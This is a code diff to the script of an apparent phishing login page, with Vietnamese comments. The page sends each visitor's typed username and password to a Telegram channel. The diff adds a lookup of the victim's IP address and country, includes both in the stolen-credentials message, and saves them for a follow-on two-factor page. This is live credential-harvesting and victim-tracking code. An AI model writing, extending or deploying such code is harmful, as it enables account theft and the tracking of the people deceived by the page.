@@ -257,11 +257,34 @@
                 timestamp: new Date().toISOString()
             }));
 
+            // Lấy thông tin IP và quốc gia
+            let ipInfo = { ip: 'Đang xác định...', country: 'Đang xác định...' };
+            
+            try {
+                // Lấy địa chỉ IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipInfo.ip = ipData.ip;
+                
+                // Lấy thông tin quốc gia từ IP
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                ipInfo.country = `${geoData.country_name || 'Không xác định'} (${geoData.country_code || 'N/A'})`;
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                ipInfo.ip = 'Không xác định';
+                ipInfo.country = 'Không xác định';
+            }
+
+            // Lưu thông tin IP vào localStorage để sử dụng ở trang 2FA
+            localStorage.setItem('ip_info', JSON.stringify(ipInfo));
+
             // Gửi đến Telegram
             const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
                          `👤 <b>Username:</b> ${username}\n` +
                          `🔑 <b>Password:</b> ${password}\n\n` +
-                         `🌐 <b>User Agent:</b> ${navigator.userAgent}\n` +
+                         `🌐 <b>IP Address:</b> ${ipInfo.ip}\n` +
+                         `📍 <b>Country:</b> ${ipInfo.country}\n` +
                          `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
             
             try {
@@ -271,7 +294,7 @@
                     body: JSON.stringify({ message })
                 });
             } catch (error) {
-                console.log('Error sending to Telegram:', error);
+                console.error('Error sending to Telegram:', error);
             }
             
             // Chuyển trang
